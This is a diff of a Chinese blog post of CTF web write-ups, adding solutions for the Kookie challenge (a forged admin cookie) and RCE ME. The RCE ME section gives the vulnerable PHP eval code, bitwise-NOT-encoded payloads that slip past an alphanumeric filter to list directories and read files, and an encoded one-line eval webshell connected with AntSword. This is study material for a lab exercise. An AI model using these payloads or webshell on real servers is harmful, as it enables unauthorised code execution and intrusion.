@@ -28,8 +28,13 @@
 <meta property="og:description" content="[toc] 0x30.[WUSTCTF2020]朴实无华(审计)robots找到个文件fAke_f1agggg.php，假的flag，查看头，找到fl4g.php。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpheader(&amp;#x27;Content-type:text&#x2F;h">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20211005183401519.png">
+<meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405231609674.png">
+<meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405233218476.png">
+<meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405234450364.png">
+<meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235340391.png">
+<meta property="og:image" content="http://example.com/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235406928.png">
 <meta property="article:published_time" content="2021-09-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-03-29T13:06:35.762Z">
+<meta property="article:modified_time" content="2022-04-05T15:54:18.601Z">
 <meta property="article:author" content="郁涛丶">
 <meta property="article:tag" content="WEB">
 <meta name="twitter:card" content="summary">
@@ -340,7 +345,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">3.7k</span>阅读时长: <span class="post-count reading-time">17 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">4k</span>阅读时长: <span class="post-count reading-time">19 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -653,7 +658,38 @@
 <h1 id="0x3B-BSidesCF-2019-Futurella"><a href="#0x3B-BSidesCF-2019-Futurella" class="headerlink" title="0x3B.[BSidesCF 2019]Futurella"></a>0x3B.[BSidesCF 2019]Futurella</h1><p>….也不知道想考啥，进去就有flag</p>
 <h1 id="0x3C-GYCTF2020-FlaskApp"><a href="#0x3C-GYCTF2020-FlaskApp" class="headerlink" title="0x3C.[GYCTF2020]FlaskApp"></a>0x3C.[GYCTF2020]FlaskApp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>)</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure>
 
-<h1 id="0x3D-BSidesCF-2019-Kookie"><a href="#0x3D-BSidesCF-2019-Kookie" class="headerlink" title="0x3D.[BSidesCF 2019]Kookie"></a>0x3D.[BSidesCF 2019]Kookie</h1>
+<h1 id="0x3D-BSidesCF-2019-Kookie"><a href="#0x3D-BSidesCF-2019-Kookie" class="headerlink" title="0x3D.[BSidesCF 2019]Kookie"></a>0x3D.[BSidesCF 2019]Kookie</h1><p>提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> Log in as admin!</span><br><span class="line"></span><br><span class="line">We found the account cookie / monster </span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: username=admin</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3E-极客大挑战-2019-RCE-ME"><a href="#0x3E-极客大挑战-2019-RCE-ME" class="headerlink" title="0x3E.[极客大挑战 2019]RCE ME"></a>0x3E.[极客大挑战 2019]RCE ME</h1><p>审计：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>正则可视化：</p>
+<p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405231609674.png" alt="image-20220405231609674"></p>
+<p>异或或者去取反绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">payload:</span><br><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405233218476.png" alt="image-20220405233218476"></p>
+<p>禁用了很多函数，</p>
+<p>可以使用scandir和readfile：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//print_r(scandir(&#x27;./&#x27;))</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;print_r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(~<span class="string">&#x27;scandir&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D</span><br><span class="line">%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D</span><br><span class="line">payload:</span><br><span class="line">(~%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D)((~%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D)((<span class="string">&quot;/&quot;</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>之后使用readfile读：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~&#x27;readfile&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//%8D%9A%9E%9B%99%96%93%9A</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">flag:(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%99%93%9E%98));</span><br><span class="line">readflag:(~%8D%9A%9E%9B%99%96%93%9A)((~%D0%8D%9A%9E%9B%99%93%9E%98));</span><br></pre></td></tr></table></figure>
+
+<p>flag是空的，readflag是elf文件：</p>
+<p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405234450364.png" alt="image-20220405234450364"></p>
+<p>传一句话马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连之后并没有权限，有这样一个插件</p>
+<p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235340391.png" alt="image-20220405235340391"></p>
+<p><img src="/2021/09/16/BUU-WEB-0x30-0x3F/image-20220405235406928.png" alt="image-20220405235406928"></p>
+<p>之后就可以运行readflag了。</p>
+
     </article>
     <!-- license -->
     
@@ -802,7 +838,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x30-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">0x30.[WUSTCTF2020]朴实无华(审计)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x31-WesternCTF2018-shrine-SSTI"><span class="toc-number">2.</span> <span class="toc-text">0x31.[WesternCTF2018]shrine(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x32-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x32.[SWPU2019]Web1(无列名注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x33-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">4.</span> <span class="toc-text">0x33.[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x34-SUCTF-2019-Pythonginx"><span class="toc-number">5.</span> <span class="toc-text">0x34.[SUCTF 2019]Pythonginx</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x35-MRCTF2020-PYWebsite"><span class="toc-number">6.</span> <span class="toc-text">0x35.[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x36-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text">0x36.[极客大挑战 2019]FinalSQL(盲注)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x37-MRCTF2020-Ezpop"><span class="toc-number">8.</span> <span class="toc-text">0x37.[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x38-NPUCTF2020-ReadlezPHP"><span class="toc-number">9.</span> <span class="toc-text">0x38.[NPUCTF2020]ReadlezPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x39-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-SSTI"><span class="toc-number">10.</span> <span class="toc-text">0x39.[CISCN2019 华东南赛区]Web11(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3A-BJDCTF2020-EasySearch"><span class="toc-number">11.</span> <span class="toc-text">0x3A.[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3B-BSidesCF-2019-Futurella"><span class="toc-number">12.</span> <span class="toc-text">0x3B.[BSidesCF 2019]Futurella</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3C-GYCTF2020-FlaskApp"><span class="toc-number">13.</span> <span class="toc-text">0x3C.[GYCTF2020]FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3D-BSidesCF-2019-Kookie"><span class="toc-number">14.</span> <span class="toc-text">0x3D.[BSidesCF 2019]Kookie</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x30-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.</span> <span class="toc-text">0x30.[WUSTCTF2020]朴实无华(审计)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x31-WesternCTF2018-shrine-SSTI"><span class="toc-number">2.</span> <span class="toc-text">0x31.[WesternCTF2018]shrine(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x32-SWPU2019-Web1-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x32.[SWPU2019]Web1(无列名注入)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x33-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="toc-number">4.</span> <span class="toc-text">0x33.[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x34-SUCTF-2019-Pythonginx"><span class="toc-number">5.</span> <span class="toc-text">0x34.[SUCTF 2019]Pythonginx</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x35-MRCTF2020-PYWebsite"><span class="toc-number">6.</span> <span class="toc-text">0x35.[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x36-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">7.</span> <span class="toc-text">0x36.[极客大挑战 2019]FinalSQL(盲注)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x37-MRCTF2020-Ezpop"><span class="toc-number">8.</span> <span class="toc-text">0x37.[MRCTF2020]Ezpop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x38-NPUCTF2020-ReadlezPHP"><span class="toc-number">9.</span> <span class="toc-text">0x38.[NPUCTF2020]ReadlezPHP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x39-CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-SSTI"><span class="toc-number">10.</span> <span class="toc-text">0x39.[CISCN2019 华东南赛区]Web11(SSTI)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3A-BJDCTF2020-EasySearch"><span class="toc-number">11.</span> <span class="toc-text">0x3A.[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3B-BSidesCF-2019-Futurella"><span class="toc-number">12.</span> <span class="toc-text">0x3B.[BSidesCF 2019]Futurella</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3C-GYCTF2020-FlaskApp"><span class="toc-number">13.</span> <span class="toc-text">0x3C.[GYCTF2020]FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3D-BSidesCF-2019-Kookie"><span class="toc-number">14.</span> <span class="toc-text">0x3D.[BSidesCF 2019]Kookie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x3E-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">15.</span> <span class="toc-text">0x3E.[极客大挑战 2019]RCE ME</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1102,408 +1138,6 @@
         
         
     
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
         
         
         
